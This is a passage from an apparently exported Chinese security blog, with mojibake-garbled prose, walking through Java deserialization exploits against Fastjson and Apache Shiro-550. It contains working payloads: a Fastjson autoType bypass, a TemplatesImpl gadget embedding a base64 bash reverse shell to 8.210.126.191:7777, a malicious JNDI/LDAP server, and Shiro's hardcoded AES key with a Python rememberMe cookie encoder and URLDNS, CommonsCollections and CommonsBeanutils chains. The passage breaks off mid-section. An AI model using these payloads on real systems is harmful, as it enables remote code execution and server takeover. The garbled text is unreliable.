2.1ç»•è¿‡æµç¨‹Fastjsonåœ¨1.2.24ç‰ˆæœ¬ä¹‹åè¿›è¡Œäº†ä¸€äº›è¿™æ–¹é¢çš„ä¿®å¤ï¼Œå¦‚æœæˆ‘ä»¬æ­¤æ—¶å†æ‰“åŸå…ˆçš„é“¾å­å°±ä¼šæŠ¥é”™ï¼šautoType is not support. org.apache.tomcat.dbcp.dbcp2.BasicDataSourceï¼Œè¿™æ˜¯å› ä¸ºæ–°ç‰ˆæœ¬åœ¨DefaultJSONParserç±»é‡Œè¾¹è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ï¼Œå°†åŸå…ˆç›´æ¥loadClassçš„åœ°æ–¹æ”¹æˆäº†å¦‚ä¸‹æ‰€ç¤ºï¼š è€ŒcheckAutoTypeæ–¹æ³•é‡Œè¾¹åˆ™æ˜¯å¯¹ä¸€äº›å±é™©ç±»è¿›è¡Œäº†è¿‡æ»¤ï¼š ä½†å®é™…ä¸Šè¿˜æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼ŒcheckAutoTypeæ–¹æ³•åœ¨è¿›è¡Œæˆ‘ä»¬è¿™ä¸ªèƒ½è¿›å»çš„é»‘åå•æ ¡éªŒä¹‹å‰ï¼Œè¿˜è¿›è¡Œäº†ä¸¤ä¸ªåˆ¤æ–­ï¼Œç¬¬ä¸€ä¸ªåˆ¤æ–­autoTypeSupportæ˜¯å¦ä¸ºtrueä»¥åŠexpectClassæ˜¯å¦ä¸ºç©ºï¼Œè¿™ä¸ªç”±äºautoTypeSupporté»˜è®¤ä¸ºfalseï¼Œæ‰€ä»¥è¯´è¿›ä¸å»ï¼Œæˆ‘ä»¬ä¸ç”¨ç®¡ ç¬¬äºŒä¸ªåˆ¤æ–­æ˜¯åˆ¤æ–­æ˜¯å¦æ‰€æŒ‡å®šçš„ç±»åå­˜åœ¨äºç¼“å­˜ä¸­ï¼Œå¦‚æœå­˜åœ¨åˆ™å¯ç›´æ¥åŠ è½½ï¼Œä»è€Œç»•è¿‡åç»­çš„é»‘åå•æ ¡éªŒï¼š æˆ‘ä»¬ç›´æ¥è¿›getClassFromMappingçœ‹ä¸€ä¸‹ï¼š è°ƒç”¨mappingsèµ‹å€¼çš„åœ°æ–¹æœ‰è¿™äº›ï¼š å®é™…ä¸Šèƒ½å¤Ÿç»™å®ƒèµ‹å€¼çš„å°±åªæœ‰addBaseClassMappingså’ŒloadClassï¼Œå› ä¸ºåªæœ‰è¿™ä¿©é‡Œè¾¹æœ‰ç”¨åˆ°putï¼Œç„¶è€Œç»è¿‡æŸ¥çœ‹å¯ä»¥çŸ¥é“ï¼ŒaddBaseClassMappingsæ˜¯ä¸€ä¸ªå†™æ­»çš„æ–¹æ³•ï¼Œé‡Œè¾¹putçš„ç±»éƒ½æ˜¯ä»¥åŠå†™å¥½çš„ï¼Œæ— æ³•æ›´æ”¹ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬å°±åªèƒ½çœ‹loadClassäº†ï¼š å·®ä¸å¤šè¿™é‡Œæ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†loadClassï¼Œå¹¶ä¸”æœ‰ç”¨ï¼š æœ€ç»ˆå‘ç°MisCodecé‡Œçš„deserialzeæ–¹æ³•é‡Œè¾¹èƒ½å¯¹å…¶ä¼ å‚è¿›è¡Œæ§åˆ¶ï¼š è€ŒMisCodecå®é™…ä¸Šæ˜¯ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼š è€Œåœ¨DefaultJSONParserç±»ä¸­å¯¹ååºåˆ—åŒ–å™¨çš„è°ƒç”¨åœ¨ç¬¬334è¡Œï¼š getDeserializeråœ¨ParserConfigç±»é‡Œè¾¹ï¼Œè¿™ä¸ªç±»ä¼šé’ˆå¯¹ä¸åŒçš„ç±»è°ƒç”¨ä¸åŒçš„ååºåˆ—åŒ–å™¨ï¼š è€Œè°ƒç”¨MiscCodecè¿™ä¸ªååºåˆ—åŒ–å™¨ä¹‹åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶strValæ¥å¯¹loadClassåŠ è½½çš„ç±»åè¿›è¡Œæ§åˆ¶äº†ï¼š 2.2æ„é€ é“¾å­æˆ‘ä»¬éœ€è¦å…ˆæŠŠç±»æ”¾åˆ°ç¼“å­˜é‡Œå†æ‹¿å‡ºæ¥ååºåˆ—åŒ–ï¼Œæ‰€ä»¥è¯´éœ€è¦ä¸¤æ­¥ï¼š ç¬¬ä¸€æ­¥ï¼š é¦–å…ˆï¼Œæˆ‘ä»¬æŒ‡å®šçš„ç±»éœ€è¦æ˜¯ä¸€ä¸ªClass.classæ‰èƒ½è°ƒç”¨MiscCodecè¿™ä¸ªååºåˆ—åŒ–å™¨ï¼Œæ‰€ä»¥è¯´æˆ‘ä»¬ç›´æ¥æŒ‡å®šjava.lang.Classå°±å¥½äº† å…¶æ¬¡ï¼ŒMiscCodecçš„deserialzeæ–¹æ³•è¿™é‡Œè¡¨æ˜ä¼ å‚çš„keyå€¼å¦‚æœä¸ä¸ºvalçš„è¯å°±ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶keyä¸ºvalï¼Œè‡³äºvalueåˆ™æ˜¯æˆ‘ä»¬è¦ç”¨çš„æ¶æ„ç±»ï¼Œè¿™é‡Œç›´æ¥ä¼ å…¥com.sun.rowset.JdbcRowSetImpl ç¬¬äºŒæ­¥ï¼š ç›´æ¥æŠŠJdbcRowSetImplé“¾ç»™æ‹¿è¿‡æ¥å°±è¡Œäº† æœ€ç»ˆç»“æœï¼š 123String s = &quot;&#123;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;,&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;DataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:7777/TestRef\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject); æ‰§è¡ŒæˆåŠŸ 3.Fastjson&lt;&#x3D;1.2.83123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Fastjson83 &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static byte[] genPayload(String cmd) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjIxMC4xMjYuMTkxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#125;); setValue(templates, &quot;_name&quot;, &quot;aaa&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize));// ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));// objectInputStream.readObject(); &#125;&#125; 4.Jndi+ldapæœåŠ¡å™¨ä»£ç ï¼ˆè‡³äºjndi+ldapçš„æœåŠ¡å™¨ä»£ç ï¼Œæˆ‘å¿˜è®°copyçš„å“ªä½å¤§ä½¬çš„äº†ï¼Œå°±å…ˆè´´åœ¨ä¸‹è¾¹ï¼Œä¾µåˆ ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;public class JNDILDAPServer &#123; private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;; public static void main ( String[] tmp_args ) &#123; String[] args=new String[]&#123;&quot;http://127.0.0.1:8081/#TestRef&quot;&#125;; int port = 7777;//æŒ‡å®šç«¯å£ try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( &quot;listen&quot;, //$NON-NLS-1$ InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$ ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;)); System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl); e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(&#x27;#&#x27;); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(&quot;javaCodeBase&quot;, cbstring); e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$ e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; è¿è¡Œä¹‹ååœ¨æ¶æ„ç±»æ‰€åœ¨ç›®å½•ä¸Šå¼€ä¸€ä¸ª8081ç«¯å£çš„http.serverå³å¯","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:Shiro-550ååºåˆ—åŒ–","slug":"JAVAå®‰å…¨shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ","date":"2024-03-21T01:24:07.191Z","updated":"2024-03-23T14:03:34.190Z","comments":true,"path":"2024/03/21/JAVAå®‰å…¨shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ/","link":"","permalink":"http://example.com/2024/03/21/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;23 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;23 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€Apache Shiroæ˜¯ä¸€ä¸ªå¼€æºçš„Javaå®‰å…¨æ¡†æ¶ï¼Œå¯æ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚Shiro-550çš„æ¼æ´æœ€æ—©æŠ«éœ²äº2016å¹´ï¼Œå½±å“ç‰ˆæœ¬ä¸ºï¼šshiro&lt;1.2.4ï¼Œç‰¹å¾ï¼šè¿”å›åŒ…çš„httpå¤´ä¸­åŒ…å«Set-Cookie: rememberMe&#x3D;deleteMe emmmâ€¦.ç›´æ¥å¼€å§‹å­¦ä¹ å§ æ­£æ–‡1.ç¯å¢ƒæ­å»º&lt;1&gt;ç›´æ¥ä¸‹è½½shiro-1.2.4 https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4 &lt;2&gt;æ‰“å¼€IDEAï¼Œå°†shiro-shiro-root-1.2.4çš„samplesä¸‹çš„webåŒ…ä»¥Mavençš„å½¢å¼å¯¼å…¥å³å¯ &lt;3&gt;æ›´æ”¹pom.xmlæ–‡ä»¶ä¸­çš„jstlé…ç½®ï¼Œå¢åŠ 1.2ç‰ˆæœ¬è®¾ç½®ï¼Œå¦‚ä¸‹ï¼š &lt;4&gt;é…ç½®å¥½IDEAå†…ç½®çš„tomcatæœåŠ¡ï¼Œå¯åŠ¨å³å¯ï¼ŒæˆåŠŸåæ•ˆæœå¦‚ä¸‹ï¼š 2.è°ƒè¯•Shiroçš„åŠ è§£å¯†å®é™…ä¸Šæ˜¯ä¸€å¯¹ï¼Œä»åå­—ä¹Ÿå¾ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼š 2.1 åŠ å¯†åˆ†æç›´æ¥æŠŠæ–­ç‚¹æ‰“åœ¨org.apache.shiro.mgt.AbstractRememberMeManagerç±»çš„onSuccessfulLoginæ–¹æ³•ä¸­ï¼š ç„¶åæˆ‘ä»¬å¼€å§‹è°ƒè¯•è¿è¡Œï¼Œç™»å½•root:secretè´¦å·ï¼Œå¹¶å‹¾é€‰RememberMeé€‰é¡¹ï¼Œç‚¹å‡»Loginï¼Œè½¬å…¥IDEAå¼€å§‹åˆ†æ å¯è§ç¨‹åºåœåœ¨äº†æˆ‘ä»¬çš„æ–­ç‚¹å¤„ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼š æ­¤æ—¶è¿›å…¥äº†rememberIdentityæ–¹æ³•ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼š åœ¨getIdentityToRememberæ–¹æ³•ä¸­è¿”å›äº†ç”¨æˆ·årootï¼Œå¹¶ç»™principalsèµ‹å€¼ï¼Œæ¥ç€è¿›å…¥é‡å†™çš„rememberIdentityæ–¹æ³•ï¼š åˆ°è¿™ä¸€æ­¥å°±å¼€å§‹å¯¹ç”¨æˆ·årootè¿›è¡Œæ“ä½œäº†ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼š å¯è§è¿™é‡Œå¯¹rootè¿›è¡Œäº†åºåˆ—åŒ–ï¼Œå¹¶èµ‹å€¼ç»™å­—èŠ‚æ•°ç»„ï¼Œä¹‹ååœ¨encryptä¸­è¿›è¡ŒåŠ å¯†æ“ä½œï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼š è¿›å…¥encryptæ–¹æ³•ä¹‹åï¼Œçœ‹èµ·æ¥åƒæ˜¯å¯¹åºåˆ—åŒ–ä¹‹åçš„ç”¨æˆ·åè¿›è¡Œäº†åŠ å¯†æ“ä½œï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹cipherServiceï¼š å¾ˆæ˜æ˜¾ï¼Œå¯¹åºåˆ—åŒ–ä¹‹åçš„ç”¨æˆ·åè¿›è¡Œäº†AESåŠ å¯†ï¼Œæˆ‘ä»¬è·Ÿè¿›æ¥çœ‹ä¸€ä¸‹AESåŠ å¯†çš„Keyå€¼ï¼š è¿™ä¸ªencryptionCipherKeyçš„èµ‹å€¼å¯ä»¥çœ‹ä¸€ä¸‹ï¼š å¯è§Keyå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ï¼škPH+bIxk5D2deZiIxcaaaA==çš„base64è§£ç  ç¡®å®šäº†AESåŠ å¯†çš„Keyä¹‹åæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼Œä¹‹åä¾¿æ˜¯ä¸€ç³»åˆ—çš„åŠ å¯†è¿‡ç¨‹ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œç›´æ¥çœç•¥ï¼Œç›´æ¥çœ‹åŠ å¯†å®Œæˆåçš„æµç¨‹ï¼š ç›´æ¥ä»convertPrincipalsToBytesæ–¹æ³•return valueså›åˆ°rememberIdentityï¼Œç„¶åæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ï¼š ä¹‹åä¾¿æ˜¯å¯¹åŠ å¯†åçš„å€¼è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åè®¾ç½®åˆ°cookieä¹‹ä¸­ æ€»ç»“æµç¨‹ï¼š &lt;1&gt;ç”¨æˆ·ååºåˆ—åŒ– &lt;2&gt;AESåŠ å¯† &lt;3&gt;base64åŠ å¯† &lt;4&gt;å°†åŠ å¯†ç»“æœæ”¾åˆ°cookieçš„rememberMeä¸Š 2.2 è§£å¯†åˆ†ææ³¨æ„ï¼šè§£å¯†çš„æ—¶å€™è¯·æ±‚å¤´ä¸­æ³¨æ„åˆ æ‰JSESSIONIDï¼Œå¦åˆ™ä¸ä¼šè¿›è¡Œè§£å¯†æµç¨‹ï¼ï¼ï¼ ç›´æ¥æŠŠæ–­ç‚¹æ‰“åœ¨org.apache.shiro.mgt.DefaultSecurityManagerçš„getRememberedIdentityæ–¹æ³•ä¸­ï¼š è¿™é‡Œæˆ‘ä»¬é‡ç‚¹è·Ÿè¿›getRememberedPrincipalsæ–¹æ³•ï¼š è¿™é‡Œæˆ‘ä»¬æ¯”è¾ƒæ„Ÿå…´è¶£çš„æ˜¯getRememberedSerializedIdentityæ–¹æ³•å’ŒconvertBytesToPrincipalsæ–¹æ³•ï¼Œæˆ‘ä»¬é€ä¸ªè·Ÿè¿›ä¸€ä¸‹ï¼š çœ‹èµ·æ¥å¾ˆé•¿ï¼Œå®é™…ä¸Šå°±æ˜¯è¿›è¡Œä¸¤ä¸ªä¸»è¦çš„æ“ä½œï¼Œä¸€ä¸ªæ˜¯è·å–cookieä¸­çš„base64ä¿¡æ¯ï¼Œå¦ä¸€ä¸ªå°±æ˜¯è¿›è¡Œbase64è§£å¯†å¹¶è¿”å›ï¼Œæˆ‘ä»¬å†è·Ÿè¿›convertBytesToPrincipalsæ–¹æ³•çœ‹ä¸€ä¸‹ï¼š å¯ä»¥çœ‹åˆ°å°±æ˜¯ä¸€ä¸ªAESè§£å¯†åŠ ä¸€ä¸ªååºåˆ—åŒ–ï¼Œæœ€ç»ˆè¿”å›æˆ‘ä»¬çš„ç”¨æˆ·åroot å¯è§ä»¥rootçš„èº«ä»½ç™»å½•ï¼š æ€»ç»“æµç¨‹ï¼š &lt;1&gt;è¯»å–cookieä¸­çš„rememberMeçš„å€¼ &lt;2&gt;å¯¹å€¼è¿›è¡Œbase64è§£å¯† &lt;3&gt;å¯¹è§£å¯†ç»“æœè¿›è¡ŒAESè§£å¯†+ååºåˆ—åŒ–å¾—åˆ°ç”¨æˆ·å 3.æ¼æ´åˆ©ç”¨è§£å¯†æµç¨‹ä¸­å¯¹cookieä¸­çš„rememberMeçš„å€¼æœ€ç»ˆè¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦ä¼ å…¥å‰è¾¹å­¦è¿‡çš„ååºåˆ—åŒ–è§¦å‘çš„é“¾å­ä¾¿å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ 3.1 URLDNSé“¾ç”±äºURLDNSé“¾åŸºæœ¬ä¸Šéƒ½æ˜¯ç”¨çš„Javaå†…ç½®ç±»å®ç°çš„ï¼Œæ‰€ä»¥åº”ç”¨èŒƒå›´è¾ƒå¹¿ï¼Œä½†ä¹Ÿå°±åªèƒ½ç”¨æ¥å‘èµ·DNSè¯·æ±‚ï¼Œæˆ‘ä»¬æ¥è¯•ä¸€ä¸‹ï¼š è¿™é‡Œæˆ‘ç›´æ¥æŠŠä¹‹å‰å­¦çš„URLDNSé“¾åŸå°ä¸åŠ¨æ‹¿è¿‡æ¥äº†ï¼š 1234567891011HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL,Integer&gt;();URL url = new URL(&quot;http://ob328eym9gl464dbs50lp5unwe24qt.burpcollaborator.net&quot;);Class c = url.getClass();Field hashcode = c.getDeclaredField(&quot;hashCode&quot;);hashcode.setAccessible(true);hashcode.set(url,1);hashMap.put(url,1);hashcode.set(url,-1);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));oos.writeObject(hashMap); ä¹‹åå°±æ˜¯å¯¹åºåˆ—åŒ–åçš„æ•°æ®è¿›è¡ŒAESåŠ å¯†å’Œbase64åŠ å¯†ï¼š 1234567891011121314151617181920import sysimport uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;URLDNS.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) ç„¶åæ‰“å°±å®Œäº†ï¼š æˆåŠŸ 3.2 CCé“¾å¦‚æœæ˜¯æŒ‰ç…§ä¸Šè¿°ç¯å¢ƒæ­å»ºçš„æµç¨‹æ¥çš„è¯ï¼Œå› ä¸ºshiroæœ¬èº«æ˜¯ä¸å¸¦CCä¾èµ–çš„ï¼Œæ‰€ä»¥åˆ°è¿™ä¸€æ­¥éœ€è¦åŠ ä¸€ä¸ªCCä¾èµ–ï¼š 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; ä¹‹åå‘¢ï¼Œå¦‚æœæˆ‘ä»¬æ­£å¸¸æ‹¿CCé“¾æ¥æ‰“çš„è¯æ˜¯æ‰“ä¸é€šçš„ï¼ˆtomcatçš„ç±»åŠ è½½å™¨é‡Œè¾¹ä¸æ”¯æŒæ•°ç»„ç±»çš„åŠ è½½ï¼‰ï¼Œå½“ç„¶ï¼Œå¦‚æœä½ çš„CCä¾èµ–æ˜¯CC4çš„è¯ï¼Œæ˜¯å¯ä»¥ç›´æ¥æ‹¿CC2æ¥æ‰“çš„ï¼Œæˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯CC3çš„ä¾èµ–ï¼ŒCC2æ‰“ä¸äº†ï¼Œå°±éœ€è¦æ„é€ è‡ªå·±çš„é“¾å­æ¥æŠŠTransformeræ•°ç»„ç»™å»æ‰ï¼Œæˆ‘åœ¨è¿™é‡Œå­¦çš„æ˜¯ç™½æ—¥æ¢¦ç»„é•¿çš„é“¾å­ï¼Œæ€è·¯ç›¸å½“äºä¹‹å‰å­¦è¿‡çš„CC3ã€CC6ã€CC2çš„é›†åˆï¼Œå¿˜è®°äº†çš„è¯å¯ä»¥å»çœ‹ä¸€ä¸‹å‰é¢çš„çŸ¥è¯†ï¼š 123456789101112131415161718192021222324252627TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);innerMap.remove(templates);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,invokerTransformer);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CC.txt&quot;));oos.writeObject(hashMap); 1234567891011121314151617181920import sysimport uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;shiro_CC.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) æ˜¯èƒ½å¤Ÿæ‰“çš„é€šçš„ï¼š 3.3 CBé“¾ä¸Šè¾¹ä¹Ÿè¯´äº†ï¼ŒshiroåŸç”Ÿæ˜¯ä¸å¸¦CCä¾èµ–çš„ï¼Œæ‰€ä»¥æ‰“åŸç”Ÿå°±è¦ç”¨åˆ°CBäº†ï¼Œå¦‚æœæ˜¯æŒ‰ä¸Šè¿°æµç¨‹æ­å»ºçš„ç¯å¢ƒï¼Œé‚£ä¹ˆshiroè‡ªå¸¦çš„CBæ˜¯1.8.3ç‰ˆæœ¬çš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çœ‹çœ‹é“¾å­åº”è¯¥æ€ä¹ˆæ„é€ ï¼š é¦–å…ˆï¼ŒCBé“¾æœ€åçš„å‘½ä»¤æ‰§è¡Œæµç¨‹è¿˜æ˜¯å’ŒCC3æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºåˆ©ç”¨çš„æ˜¯Javaçš„åå°„æœºåˆ¶å’ŒåŠ¨æ€ç±»åŠ è½½çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å…ˆæŠŠå‰è¾¹çš„æ‹¿è¿‡æ¥ï¼š 12345678910111213TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl()); æŒ‰åŸå…ˆCC3çš„æ­¥éª¤ï¼Œæˆ‘ä»¬æ˜¯ç›´æ¥åˆ©ç”¨TrAXfilterç±»è¿›è¡Œtemplatesçš„newTransformeræ–¹æ³•çš„è§¦å‘ï¼Œä½†è¿™é‡Œæˆ‘ä»¬CBä¾èµ–é‡Œæ˜¯æ²¡æœ‰è¿™ä¸ªç±»çš„ï¼Œå› 